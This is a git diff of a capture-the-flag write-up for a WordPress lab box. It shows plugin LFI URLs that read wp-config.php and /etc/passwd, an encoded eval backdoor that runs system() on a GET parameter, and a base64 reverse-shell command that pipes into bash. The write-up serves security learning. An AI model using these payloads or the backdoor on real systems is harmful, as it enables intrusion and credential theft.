@@ -1,3 +1,55 @@
+# CTF Write-Up: [Challenge Name]
+
+## 1. Challenge Overview
+
+- **Name:** [Challenge Name]
+- **Category:** [Pwn / Web / Crypto / Reversing / Forensics / Misc]
+- **Points:** [Points]
+- **Description:**  
+  [Copy or summarize the challenge prompt here]
+
+---
+
+## 2. Initial Analysis / Recon
+
+We performed a full port scan identifying **SSH (22)** and **HTTP (80)** as the primary entry points. The scan reveals an **Apache 2.4.41** server on Ubuntu that redirects to `www.smol.thm`, This requires us to update our `/etc/hosts` file to access the site.
+
+<div align="center">
+    <img src="./assets/1.png" style="max-height: 250px;" />
+</div>
+
+Visiting `http://www.smol.thm` reveals the "AnotherCTF" landing page, which hosts articles on vulnerabilities like **RCE**, **SSRF**, and **XSS**. This confirms the web server is operational and provides a clear starting point for manual enumeration and directory searching.
+
+<div align="center">
+    <img src="./assets/5.png" style="max-height: 250px;" />
+</div>
+
+I discovered the email address `admin@smol.thm` at the bottom of the page. This identifies a potential administrative username that I can use for future authentication attacks (or not xd).
+
+<div align="center">
+    <img src="./assets/6.png" style="max-height: 250px;" />
+</div>
+
+I ran **ffuf** to fuzz for hidden files and directories, uncovering several WordPress-specific files like `wp-config.php` and `wp-login.php`. These findings confirm the backend CMS and highlight potential areas for configuration disclosure or credential testing.
+
+<div align="center">
+    <img src="./assets/2.png" style="max-height: 250px;" />
+</div>
+
+I probed the WordPress login page and identified a discrepancy in the authentication feedback. While random emails return an `unknown` error, valid addresses like **admin@smol.thm** trigger a specific `incorrect password` message. This confirms the account exists, allowing me to perform precise user enumeration and prepare for a targeted brute-force attack (or not xd).
+
+<div style="display: flex; justify-content: center; align-items: flex-start; gap: 10px;">
+  <img src="./assets/3.png" style="width: 31%; max-height: 250px;" />
+  <img src="./assets/4.png" style="width: 31%; max-height: 250px;" />
+  <img src="./assets/7.png" style="width: 31%; max-height: 250px;" />
+</div>
+
+I used **_WPScan_** to identify the `jsmol2wp` plugin.
+
+WordPress JSmol2WP plugin 1.07 is susceptible to local file inclusion via ../ directory traversal in query=php://filter/resource= in the jsmol.php query string. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site. This can also be exploited for server-side request forgery.
+
+Source: https://pentest-tools.com/vulnerabilities-exploits/wordpress-jsmol2wp-107-local-file-inclusion_2654
+
     wpscan --url http://www.smol.thm/
 
 ---
@@ -91,82 +143,41 @@
      | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
      |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 
-    [+] Enumerating Config Backups (via Passive and Aggressive Methods)
-     Checking Config Backups - Time: 00:00:01 <===============================================> (137 / 137) 100.00% Time: 00:00:01
+## 3. Tools / Environment
 
-    [i] No Config Backups Found.
+## 4. Step-by-Step Solution
 
-    [!] No WPScan API Token given, as a result vulnerability data has not been output.
-    [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+I exploited the LFI vulnerability by accessing the following URL:  
+`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`.  
+This allowed me to read the **wp-config.php** file directly, which successfully leaked the cleartext database credentials for the `wpuser` account.
 
-    [+] Finished: Sun Mar 22 17:13:19 2026
-    [+] Requests Done: 139
-    [+] Cached Requests: 37
-    [+] Data Sent: 35.218 KB
-    [+] Data Received: 19.862 KB
-    [+] Memory used: 272.664 MB
-    [+] Elapsed time: 00:00:04
+Source: https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt
 
-The `jsmol2wp` WordPress plugin was affected by an Unauthenticated Server Side Request Forgery (SSRF) security vulnerability.
+<div align="center">
+    <img src="./assets/8.png" style="max-height: 250px;" />
+</div>
 
-`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`
+I used the credentials leaked from wp-config.php to log into the WordPress administrative panel. I am now authenticated as wpuser, giving me access to the dashboard and the internal features of the site.
 
-`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/convert.base64-encode/resource=../../../../../../../../etc/passwd`
+<div align="center">
+    <img src="./assets/10.png" style="max-height: 250px;" />
+</div>
+
+I used the URL:  
+`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/convert.base64-encode/resource=../../../../../../../../etc/passwd`  
+to exfiltrate the **/etc/passwd** file. By encoding the output in Base64, I avoided any character rendering issues and successfully identified the system users: `diego`, `gege`, `think`, and `xavi`.
+
+<div align="center">
+    <img src="./assets/15.png" style="max-height: 250px;" />
+    <img src="./assets/16.png" style="max-height: 250px;" />
+</div>
+
+I identified the **_`Hello Dolly`_** plugin while enumerating the `/wp-content/plugins/` directory.
+I used the LFI vulnerability to inspect the source code, where I discovered a suspicious `eval(base64_decode(...))` block. Decoding the string revealed a hidden backdoor: `if(isset($_GET["cmd"])){system($\_GET["cmd"]);}`. By appending `?cmd=id` to the URL, I successfully executed system commands, confirming Remote Code Execution (RCE) as the **www-data** user.
 
 `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/convert.base64-encode/resource=../../hello.php`
 
-    echo "PD9waHAKLyoqCiAqIEBwYWNrYWdlIEhlbGxvX0RvbGx5CiAqIEB2ZXJzaW9uIDEuNy4yCiAqLwovKgpQbHVnaW4gTmFtZTogSGVsbG8gRG9sbHkKUGx1Z2luIFVSSTogaHR0cDovL3dvcmRwcmVzcy5vcmcvcGx1Z2lucy9oZWxsby1kb2xseS8KRGVzY3JpcHRpb246IFRoaXMgaXMgbm90IGp1c3QgYSBwbHVnaW4sIGl0IHN5bWJvbGl6ZXMgdGhlIGhvcGUgYW5kIGVudGh1c2lhc20gb2YgYW4gZW50aXJlIGdlbmVyYXRpb24gc3VtbWVkIHVwIGluIHR3byB3b3JkcyBzdW5nIG1vc3QgZmFtb3VzbHkgYnkgTG91aXMgQXJtc3Ryb25nOiBIZWxsbywgRG9sbHkuIFdoZW4gYWN0aXZhdGVkIHlvdSB3aWxsIHJhbmRvbWx5IHNlZSBhIGx5cmljIGZyb20gPGNpdGU+SGVsbG8sIERvbGx5PC9jaXRlPiBpbiB0aGUgdXBwZXIgcmlnaHQgb2YgeW91ciBhZG1pbiBzY3JlZW4gb24gZXZlcnkgcGFnZS4KQXV0aG9yOiBNYXR0IE11bGxlbndlZwpWZXJzaW9uOiAxLjcuMgpBdXRob3IgVVJJOiBodHRwOi8vbWEudHQvCiovCgpmdW5jdGlvbiBoZWxsb19kb2xseV9nZXRfbHlyaWMoKSB7CgkvKiogVGhlc2UgYXJlIHRoZSBseXJpY3MgdG8gSGVsbG8gRG9sbHkgKi8KCSRseXJpY3MgPSAiSGVsbG8sIERvbGx5CldlbGwsIGhlbGxvLCBEb2xseQpJdCdzIHNvIG5pY2UgdG8gaGF2ZSB5b3UgYmFjayB3aGVyZSB5b3UgYmVsb25nCllvdSdyZSBsb29raW4nIHN3ZWxsLCBEb2xseQpJIGNhbiB0ZWxsLCBEb2xseQpZb3UncmUgc3RpbGwgZ2xvd2luJywgeW91J3JlIHN0aWxsIGNyb3dpbicKWW91J3JlIHN0aWxsIGdvaW4nIHN0cm9uZwpJIGZlZWwgdGhlIHJvb20gc3dheWluJwpXaGlsZSB0aGUgYmFuZCdzIHBsYXlpbicKT25lIG9mIG91ciBvbGQgZmF2b3JpdGUgc29uZ3MgZnJvbSB3YXkgYmFjayB3aGVuClNvLCB0YWtlIGhlciB3cmFwLCBmZWxsYXMKRG9sbHksIG5ldmVyIGdvIGF3YXkgYWdhaW4KSGVsbG8sIERvbGx5CldlbGwsIGhlbGxvLCBEb2xseQpJdCdzIHNvIG5pY2UgdG8gaGF2ZSB5b3UgYmFjayB3aGVyZSB5b3UgYmVsb25nCllvdSdyZSBsb29raW4nIHN3ZWxsLCBEb2xseQpJIGNhbiB0ZWxsLCBEb2xseQpZb3UncmUgc3RpbGwgZ2xvd2luJywgeW91J3JlIHN0aWxsIGNyb3dpbicKWW91J3JlIHN0aWxsIGdvaW4nIHN0cm9uZwpJIGZlZWwgdGhlIHJvb20gc3dheWluJwpXaGlsZSB0aGUgYmFuZCdzIHBsYXlpbicKT25lIG9mIG91ciBvbGQgZmF2b3JpdGUgc29uZ3MgZnJvbSB3YXkgYmFjayB3aGVuClNvLCBnb2xseSwgZ2VlLCBmZWxsYXMKSGF2ZSBhIGxpdHRsZSBmYWl0aCBpbiBtZSwgZmVsbGFzCkRvbGx5LCBuZXZlciBnbyBhd2F5ClByb21pc2UsIHlvdSdsbCBuZXZlciBnbyBhd2F5CkRvbGx5J2xsIG5ldmVyIGdvIGF3YXkgYWdhaW4iOwoKCS8vIEhlcmUgd2Ugc3BsaXQgaXQgaW50byBsaW5lcy4KCSRseXJpY3MgPSBleHBsb2RlKCAiXG4iLCAkbHlyaWNzICk7CgoJLy8gQW5kIHRoZW4gcmFuZG9tbHkgY2hvb3NlIGEgbGluZS4KCXJldHVybiB3cHRleHR1cml6ZSggJGx5cmljc1sgbXRfcmFuZCggMCwgY291bnQoICRseXJpY3MgKSAtIDEgKSBdICk7Cn0KCi8vIFRoaXMganVzdCBlY2hvZXMgdGhlIGNob3NlbiBsaW5lLCB3ZSdsbCBwb3NpdGlvbiBpdCBsYXRlci4KZnVuY3Rpb24gaGVsbG9fZG9sbHkoKSB7CglldmFsKGJhc2U2NF9kZWNvZGUoJ0NpQnBaaUFvYVhOelpYUW9KRjlIUlZSYklsd3hORE5jTVRVMVhIZzJOQ0pkS1NrZ2V5QnplWE4wWlcwb0pGOUhSVlJiSWx3eE5ETmNlRFprWERFME5DSmRLVHNnZlNBPScpKTsKCQoJJGNob3NlbiA9IGhlbGxvX2RvbGx5X2dldF9seXJpYygpOwoJJGxhbmcgICA9ICcnOwoJaWYgKCAnZW5fJyAhPT0gc3Vic3RyKCBnZXRfdXNlcl9sb2NhbGUoKSwgMCwgMyApICkgewoJCSRsYW5nID0gJyBsYW5nPSJlbiInOwoJfQoKCXByaW50ZigKCQknPHAgaWQ9ImRvbGx5Ij48c3BhbiBjbGFzcz0ic2NyZWVuLXJlYWRlci10ZXh0Ij4lcyA8L3NwYW4+PHNwYW4gZGlyPSJsdHIiJXM+JXM8L3NwYW4+PC9wPicsCgkJX18oICdRdW90ZSBmcm9tIEhlbGxvIERvbGx5IHNvbmcsIGJ5IEplcnJ5IEhlcm1hbjonICksCgkJJGxhbmcsCgkJJGNob3NlbgoJKTsKfQoKLy8gTm93IHdlIHNldCB0aGF0IGZ1bmN0aW9uIHVwIHRvIGV4ZWN1dGUgd2hlbiB0aGUgYWRtaW5fbm90aWNlcyBhY3Rpb24gaXMgY2FsbGVkLgphZGRfYWN0aW9uKCAnYWRtaW5fbm90aWNlcycsICdoZWxsb19kb2xseScgKTsKCi8vIFdlIG5lZWQgc29tZSBDU1MgdG8gcG9zaXRpb24gdGhlIHBhcmFncmFwaC4KZnVuY3Rpb24gZG9sbHlfY3NzKCkgewoJZWNobyAiCgk8c3R5bGUgdHlwZT0ndGV4dC9jc3MnPgoJI2RvbGx5IHsKCQlmbG9hdDogcmlnaHQ7CgkJcGFkZGluZzogNXB4IDEwcHg7CgkJbWFyZ2luOiAwOwoJCWZvbnQtc2l6ZTogMTJweDsKCQlsaW5lLWhlaWdodDogMS42NjY2OwoJfQoJLnJ0bCAjZG9sbHkgewoJCWZsb2F0OiBsZWZ0OwoJfQoJLmJsb2NrLWVkaXRvci1wYWdlICNkb2xseSB7CgkJZGlzcGxheTogbm9uZTsKCX0KCUBtZWRpYSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6IDc4MnB4KSB7CgkJI2RvbGx5LAoJCS5ydGwgI2RvbGx5IHsKCQkJZmxvYXQ6IG5vbmU7CgkJCXBhZGRpbmctbGVmdDogMDsKCQkJcGFkZGluZy1yaWdodDogMDsKCQl9Cgl9Cgk8L3N0eWxlPgoJIjsKfQoKYWRkX2FjdGlvbiggJ2FkbWluX2hlYWQnLCAnZG9sbHlfY3NzJyApOwo=" | base64 -d
-    <?php
-    /**
-     * @package Hello_Dolly
-     * @version 1.7.2
-     */
-    /*
-    Plugin Name: Hello Dolly
-    Plugin URI: http://wordpress.org/plugins/hello-dolly/
-    Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
-    Author: Matt Mullenweg
-    Version: 1.7.2
-    Author URI: http://ma.tt/
-    */
-
-    function hello_dolly_get_lyric() {
-            /** These are the lyrics to Hello Dolly */
-            $lyrics = "Hello, Dolly
-    Well, hello, Dolly
-    It's so nice to have you back where you belong
-    You're lookin' swell, Dolly
-    I can tell, Dolly
-    You're still glowin', you're still crowin'
-    You're still goin' strong
-    I feel the room swayin'
-    While the band's playin'
-    One of our old favorite songs from way back when
-    So, take her wrap, fellas
-    Dolly, never go away again
-    Hello, Dolly
-    Well, hello, Dolly
-    It's so nice to have you back where you belong
-    You're lookin' swell, Dolly
-    I can tell, Dolly
-    You're still glowin', you're still crowin'
-    You're still goin' strong
-    I feel the room swayin'
-    While the band's playin'
-    One of our old favorite songs from way back when
-    So, golly, gee, fellas
-    Have a little faith in me, fellas
-    Dolly, never go away
-    Promise, you'll never go away
-    Dolly'll never go away again";
-
-            // Here we split it into lines.
-            $lyrics = explode( "\n", $lyrics );
-
-            // And then randomly choose a line.
-            return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
-    }
-
+```php ...
     // This just echoes the chosen line, we'll position it later.
     function hello_dolly() {
             eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
@@ -184,39 +195,75 @@ The `jsmol2wp` WordPress plugin was affected by an Unauthenticated Server Side R
                     $chosen
             );
     }
+    ...
+```
 
-    // Now we set that function up to execute when the admin_notices action is called.
-    add_action( 'admin_notices', 'hello_dolly' );
+<div align="center">
+    <img src="./assets/17.png" style="max-height: 100px;" />
+</div>
 
-    // We need some CSS to position the paragraph.
-    function dolly_css() {
-            echo "
-            <style type='text/css'>
-            #dolly {
-                    float: right;
-                    padding: 5px 10px;
-                    margin: 0;
-                    font-size: 12px;
-                    line-height: 1.6666;
-            }
-            .rtl #dolly {
-                    float: left;
-            }
-            .block-editor-page #dolly {
-                    display: none;
-            }
-            @media screen and (max-width: 782px) {
-                    #dolly,
-                    .rtl #dolly {
-                            float: none;
-                            padding-left: 0;
-                            padding-right: 0;
-                    }
-            }
-            </style>
-            ";
-    }
+I generated a Base64-encoded payload to bypass character filtering and executed it through the cmd parameter by piping the decoded string into bash. After catching the connection with a netcat listener, I stabilized the shell using a Python PTY spawn to gain a fully interactive terminal. This allowed me to move beyond the limited web shell and operate directly on the system as www-data.
 
-    add_action( 'admin_head', 'dolly_css' );
+<div align="center">
+    <img src="./assets/18.png" style="max-height: 100px;" />
+    <img src="./assets/19.png" style="max-height: 100px;" />
+</div>
 
-`http://www.smol.thm/wp-admin/profile.php?cmd=echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzQuMjUxLzQ0NDQgMD4mMQ== | base64 -d | bash`
+I used the database password found earlier to log into **MySQL** and stole the password hashes for all the site users. I used **_`Hashcat`_** to crack the passwords, I discovered that **diego**'s real password was `sandiegocalifornia`. I then used the `su` command to switch from the web user to the **diego** user, gaining more access to the system.
+
+<div align="center">
+    <img src="./assets/20.png" style="max-height: 80px;" />
+    <img src="./assets/22.png" style="max-height: 100px;" />
+    <img src="./assets/23.png" style="max-height: 100px;" />
+</div>
+
+Inside diego's home folder i found the `user.txt` file.
+
+<div align="center">
+    <img src="./assets/24.png" style="max-height: 80px;" />
+</div>
+
+I found that the user think left his private SSH key (id_rsa) readable by other users, which is a major security flaw. I copied this key to my machine and used it to log in as him without needing a password. I am now successfully logged in as think, moving one step closer to full control.
+
+<div align="center">
+    <img src="./assets/25.png" style="max-height: 80px; display: block;" />
+    <img src="./assets/26.png" style="max-height: 350; display: block;;" />
+    <img src="./assets/27.png" style="max-height: 80px; display: block;" />
+</div>
+
+I discovered a pre-existing flaw in the **PAM** (Pluggable Authentication Modules) system, which handles how users log in. The file `/etc/pam.d/su` contained a rule that specifically allowed the user think to switch to gege without a password. In Linux, marking a rule as 'sufficient' means that if the condition is met (in this case, being the user think), the system decides that's "enough" proof and skips the password check entirely.
+
+<div align="center">
+    <img src="./assets/28.png" style="max-height: 250px; display: block;" />
+    <br/>
+    <img src="./assets/29.png" style="max-height: 200px; display: block;" />
+    <br/>
+</div>
+
+I found an old file called `wordpress.old.zip` in gege's folder. To get it onto my Kali machine, I turned it into a text file using **base64** (so it wouldn't break during the move) and started a small web server with **Python** to "host" it. Once I downloaded and decoded it on my machine, I realized the zip was encrypted. I used **_`zip2john`_** to grab the password's "fingerprint" and John the Ripper to guess the password: `hero_gege@hotmail.com`. Inside, I found a new `wp-config.php` with a password for the user `xavi`.
+
+<div>
+    <img src="./assets/30.png" style="max-height: 250px; display: block;" />
+    <br/>
+    <img src="./assets/31.png" style="max-height: 250px; display: block;" />
+    <br/>
+    <img src="./assets/32.png" style="max-height: 250px; display: block;" />
+    <br/>
+    <img src="./assets/34.png" style="max-height: 250px; display: block;" />
+    <br/>
+    <img src="./assets/35.png" style="max-height: 250px; display: block;" />
+    <br/>
+    <img src="./assets/36.png" style="max-height: 250px; display: block;" />
+    <br/>
+</div>
+
+I used the password found in the backup file to log in as **xavi**. To see what he could do on the system, I ran the `s` command, which revealed that he has full administrative privileges—meaning he can run any command as any user. I immediately ran `sudo su` to become the **root** user and captured the final flag in `/root/root.txt`.
+
+<div>
+    <img src="./assets/37.png" style="max-height: 250px; display: block;" />
+    <br/>
+    <img src="./assets/38.png" style="max-height: 250px; display: block;" />
+    <br/>
+</div>
+
+## 5. Exploit / Solution Code
